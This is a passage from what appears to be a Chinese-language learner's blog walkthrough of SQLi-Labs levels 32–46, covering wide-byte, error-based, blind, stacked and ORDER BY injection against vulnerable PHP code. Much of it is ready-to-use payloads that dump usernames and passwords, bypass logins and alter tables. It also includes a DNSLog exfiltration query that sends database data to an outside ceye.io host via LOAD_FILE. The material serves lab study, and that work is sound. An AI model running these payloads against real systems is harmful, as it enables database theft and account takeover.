+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;-1%df&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function check_addslashes($string)
+&#123;
+    $string&#x3D; addslashes($string);    
+    return $string;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这次过滤语句变味了addslashes，我们需要了解下它的功能。</p>
+<p>ddslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<table>
+<thead>
+<tr>
+<th>预定义字符</th>
+<th>转义后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\</td>
+<td>\‘</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>&#39;</td>
+</tr>
+<tr>
+<td>“</td>
+<td>&quot;</td>
+</tr>
+</tbody></table>
+<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p>
+<p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
+<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>username=’$uname’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$uname &#x3D; addslashes($uname1);
+   $passwd&#x3D; addslashes($passwd1);
+mysql_query(&quot;SET NAMES gbk&quot;);
+@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;
+$result&#x3D;mysql_query($sql);
+$row &#x3D; mysql_fetch_array($result);
+
+if($row)&#123;
+输出结果;
+&#125;
+else&#123;
+报错
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>与上题没有区别,只是请求方式改为了POST</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+uname&#x3D;-1%df&#39; UNION SELECT 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;123
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>注意，不知道为什么在文本框输入以及POSTMAN发送都无法成功，语句一模一样，难道是因为经过url编码的问题吗。</p>
+<p>此外还有一个方法在注入天书以及国光的博客中。之后再研究以下。</p>
+<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>额,过滤还是老套路,但是这次竟然没有闭合,导致过滤语句直接没用了….。直接给payload吧</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users),3#
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+$id&#x3D;check_quotes($_GET[&#39;id&#39;]);
+
+function check_quotes($string)
+&#123;
+    $string&#x3D; mysql_real_escape_string($string);    
+    return $string;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p>
+<table>
+<thead>
+<tr>
+<th>危险字符</th>
+<th>转义后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\</td>
+<td>\</td>
+</tr>
+<tr>
+<td>‘</td>
+<td>&#39;</td>
+</tr>
+<tr>
+<td>“</td>
+<td>&quot;</td>
+</tr>
+</tbody></table>
+<p>我们之前的思路完全是可行的</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+id&#x3D;-1%df&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- +
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>与Less-34类似，我们可以使用一样的思路</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+uname&#x3D;1%df&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT MID((IFNULL(CAST((password) AS NCHAR),0x20)),1,54) FROM security.users),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe&amp;passwd&#x3D;123
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>经过三天还是四天来着，我也忘记了，反正可算搞完提升了，最近在学java和kali之类的，而且还在上课，所有精力没办法全放在这。完成了总归是好了。碎碎念结束，</p>
+<p>下面我们捋一下我学到了那些东西。</p>
+<ol>
+<li><p>首先，我们我们学到了报文头部的注入点，以及当他们有base64解密时应当怎么做。</p>
+</li>
+<li><p>然后就是对于注释符的过滤，很简单简单闭合就可，比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+?id&#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;1 
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li><p>之后便是二次注入，二次注入是什么呢？简单的说就是通过注册之类的方式先将注入语句写入数据库当中，不直接的进行注入，而是在其他地方调用这个语句，比如改密码，由此运行这个语句，从而完成了注入。</p>
+</li>
+<li><p>and与or以及各种关键词被过滤了，很多种过滤语句都有一种问题——没有循环，过滤一次就完了，这种时候我们就可以进行双写来绕过。又或者它的过滤条件不够充分，出现使用大小写就绕过的情况，所以我们使用正则表达式的时候将**/i**加上。至于or和and可以用&amp;&amp;和||进行代替。</p>
+</li>
+</ol>
+<p>空格的绕过就有很多替代，比如我常用的%0b啊，其他的看我Less-26的解题。</p>
+<ol start="5">
+<li><p>参数污染，也是一种很很巧妙的绕过，只要靠的就是apache的特性，当遇到相同的参数时，总是取最后一个。</p>
+</li>
+<li><p>宽字节注入，使用条件为GBK编码，会认为两个字符为汉字，而数据库并不在意数字直接忽略，由此使用%df与/拼接，完美绕过addslashes和mysql_real_escape_string。</p>
+</li>
+</ol>
+<p>总结完毕，看起来不多，但是在构造payload时总是遇到各种情况，就是无法正常运行，主要是有些浮躁，没有考虑的完全清楚就去构造了，之后还应该注意。争取在之后的练习改正。与君共勉。</p>
+<h2 id="Stacked-Injection"><a href="#Stacked-Injection" class="headerlink" title="Stacked Injection"></a>Stacked Injection</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>本次的注入的主题为堆叠注入。那么什么是堆叠注入呢</p>
+<p>MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。</p>
+<p><img src="stackedInjection1.png"></p>
+<p>这很好理解，写过sql语句的都应该理解原理。</p>
+<p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p>
+<p>但是他仍然有缺陷。</p>
+<ol>
+<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li>
+<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者结果只能被忽略</li>
+</ol>
+<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
+<h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>SQL注入一般分为报错注入和盲注，盲注的又分为布尔盲注和时间盲注。</p>
+<p>当我们发现一个站点存在一个没有数据回显的注入点进行注入时，只能采取盲注，这种注入速度非常慢，需要一个一个字符猜解，而且很容易搞挂网站，这时候我们就需要寻找一种快速有效的方法来获取数据。</p>
+<p>此时我们就可以利用DNS来快速的获取数据，当然我们也可以在无回显的命令执行或者无回显的SSRF中利用</p>
+<p>特点：速度快，能够绕过某些防护软件的限制</p>
+<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>计算机网络的内容，这里不赘述了，简单地说想要得到域名所映射的IP地址，需要DNS协议进行解析。</p>
+<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><ol>
+<li>Windows环境：</li>
+</ol>
+<p>所以我们需要搭建Windows环境下的SQLILABS环境。</p>
+<ol start="2">
+<li>DNSLog：</li>
+</ol>
+<p>我们传输的数据传输到哪？如何查看？这就需要DNSLog的帮助。</p>
+<p>这里给大家我正在使用的DNSLog网站，当然还可以自己搭建，如果有兴趣可以自己去网上查找教程。</p>
+<p><a target="_blank" rel="noopener" href="http://ceye.io/">ceye</a></p>
+<ol start="3">
+<li>MySQL 开启 load_file()</li>
+</ol>
+<p>这里说一下我遇到的坑，我一开始始终无法将DNS请求发送出去，用Wireshark抓包也无法抓到，最终通过下面的文章解决。如果你遇到了和我一样的问题，不妨看一下。</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/259904021">https://zhuanlan.zhihu.com/p/259904021</a></p>
+<h4 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h4><p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p>
+<p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p>
+<p>UNC是一种命名惯例, 主要用于在Microsoft  Windows上指定和映射网络驱动器。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径</p>
+<p>格式： </p>
+<pre class="line-numbers language-none"><code class="language-none">\\servername\sharename
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中 servername 是服务器名，sharename 是共享资源的名称。</p>
+<p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：</p>
+<pre class="line-numbers language-none"><code class="language-none">\\servername\sharename\directory\filename
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=’$id’</td>
+</tr>
+</tbody></table>
+<p>我们在上面说明了一些基础知识，现在我们通过题目开始投注于实践。</p>
+<p>老规矩先看源码，其实与之前区别不大，主要在于查询函数的区别</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+&#x2F;&#x2F; 现在
+mysqli_multi_query($con1, $sql)
+
+&#x2F;&#x2F; 从前
+$result&#x3D;mysql_query($sql);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。</p>
+<p>要获得执行结果中的第一个结果集，请使用 mysqli_use_result() 或 mysqli_store_result() 函数。 要读取后续的结果集， 请使用 mysqli_more_results() 和 mysqli_next_result() 函数。</p>
+<p>源代码</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+if (mysqli_multi_query($con1, $sql))
+&#123;
+    
+    
+    &#x2F;* store first result set *&#x2F;
+    if ($result &#x3D; mysqli_store_result($con1))
+    &#123;
+        if($row &#x3D; mysqli_fetch_row($result))
+        &#123;
+            输出账号密码
+        &#125;
+			  &#x2F;&#x2F; 释放因为result所占用的内存(虽然这个语句备注了，但遇到不会的还是查一下吧)
+&#x2F;&#x2F;            mysqli_free_result($result);
+    &#125;
+        &#x2F;* print divider *&#x2F;
+		
+		&#x2F;&#x2F; 向下获得结果集
+    if (mysqli_more_results($con1))
+    &#123;
+            &#x2F;&#x2F;printf(&quot;-----------------\n&quot;);
+    &#125;
+     &#x2F;&#x2F;while (mysqli_next_result($con1));
+&#125;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从源码中我们可以清晰看出，我们使用堆叠查询也只能获得一个结果，但是我们可以进行一些不需要看结果的操作，比如修改表，创建列之类的。</p>
+<p>我们在这里就可以用，DNSLog数据外带。</p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?id&#x3D; 1&#39;;SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT hex(user())),&#39;.mysql.ip.port.k2y7z4.ceye.io\\abc&#39;));--+      
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p>
+<p><img src="Less-38.png"></p>
+<p>然后进行hex解码即可。</p>
+<p>因为我在网站无法使用，所以直接在命令行中进行了执行。</p>
+<h4 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h4><p>国光提了一下，我也没仔细研究，以后再说</p>
+<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<p>仅仅闭合方式不同</p>
+<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>缺少了报错</p>
+<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注</td>
+<td>id=$id</td>
+</tr>
+</tbody></table>
+<p>与LEss-40类似，缺少了报错盲注。</p>
+<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>id=‘$id’</td>
+</tr>
+</tbody></table>
+<p>首先在首页我们是无法进入其他页面的，他也提示我们直接在login进行注入。</p>
+<p>老规矩先看源码。</p>
+<p>login.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+ <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>结果<span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  报错
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+  报错
+  <span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们可以很明显的发现，username经过了过滤，但是password并没有，因而我们可以通过各种方式进行注入。</p>
+<p>首先，我们来个常规的报错注入。</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(SELECT MID((IFNULL(CAST((column_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 0,1),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe
+
+&#96;&#96;&#96;&#96;
+
+此外还可以使用堆叠注入。
+
+我们还可以使用万能密码
+
+&#96;&#96;&#96; payload
+
+1&#39; or 1 -- +
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>登录成功后显示的用户为Dumb, 因为return $row[1];所以返回id=1的成员，即Dumb</p>
+<p>然后我们看到了可以修改密码。查看以下源码</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+$username&#x3D; $_SESSION[&quot;username&quot;];
+	$curr_pass&#x3D; mysql_real_escape_string($_POST[&#39;current_password&#39;]);
+	$pass&#x3D; mysql_real_escape_string($_POST[&#39;password&#39;]);
+	$re_pass&#x3D; mysql_real_escape_string($_POST[&#39;re_password&#39;]);
+	
+	if($pass&#x3D;&#x3D;$re_pass)
+	&#123;	
+		$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;
+	｝
+	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第一反应和Less-24一样使用二次注入，但是我们没有注册，怎么办呢。</p>
+<p>堆叠注入啊。我们完全可以从登录页面输入修改Dumb的用户名或者密码的注入语句，这样我们就可以在改密码的时候调用语句，形成二次注入。事不宜迟，我们试一下吧。</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">
+login_password&#x3D;1&#39; or 1 -- +
+&amp;login_user&#x3D;
+alter TABLE users modify COLUMN username varchar(2000);
+UPDATE users SET username &#x3D; &quot;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password) FROM users)#&quot;
+WHERE username &#x3D; &quot;Dumb&quot;;&amp;mysubmit&#x3D;Login
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>嗯….上面语句在数据库中执行是可以的，但是输入后进入的页面用户还是dumb，原因未知。大家可以帮我看一下哪里出错了，反正就当一次脑洞了。</p>
+<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>id=(‘$id’)</td>
+</tr>
+</tbody></table>
+<p>利用方式相同。</p>
+<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>id=‘$id’</td>
+</tr>
+</tbody></table>
+<p>利用方式相同。缺少报错</p>
+<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td>
+<td>id=（‘$id’）</td>
+</tr>
+</tbody></table>
+<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>时间盲注&amp; 布尔盲注&amp;报错</td>
+<td>order by $sort</td>
+</tr>
+</tbody></table>
+<p>与之前的都有所不同</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">
+$sql &#x3D; &quot;SELECT * FROM users ORDER BY $id&quot;;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>注入点变为order by，不能使用union等注入。</p>
+<h4 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h4><ul>
+<li>方法一, 排序顺序</li>
+</ul>
+<pre class="line-numbers language-method" data-language="method"><div class="caption"><span>1</span></div><code class="language-method">
+&#x2F;&#x2F; 正序排序
+?sort&#x3D;1%20asc
+
+&#x2F;&#x2F; 倒序排序
+?sort&#x3D;1 desc
+
+&#96;&#96;&#96;&#96;
+
+两次结果的排序以id为标准，说明有order by
+
+* 方法二：rand（）排序
+
+
+rand(true) 和 rand(false)的结果是不同的
+
+&#96;&#96;&#96; method
+
+?sort&#x3D;rand(true)
+
+?sort&#x3D;rand(false)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据结果不同可以使用布尔盲注</p>
+<ul>
+<li>延时验证</li>
+</ul>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?sort&#x3D;sleep(1)
+?sort&#x3D;(sleep(1))
+?sort&#x3D;1 and sleep(1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>延时时间为1*行数</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><ul>
+<li>报错注入</li>
+</ul>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+1 AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES  WHERE table_schema IN (0x7365637572697479)LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>布尔盲注</li>
+</ul>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)
+?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>延时注入</li>
+</ul>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))
+?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>procedure analyse注入</li>
+</ul>
+<p>利用procedure analyse参数，我们可以执行报错注入。同时，在procedure analyse和order by之间可以存在limit参数，我们在实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。</p>
+<p>PROCEDURE ANALYSE()自 MySQL 5.7.18 起已弃用，并已在 MySQL 8.0 中删除</p>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">
+?sort&#x3D;1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)
+
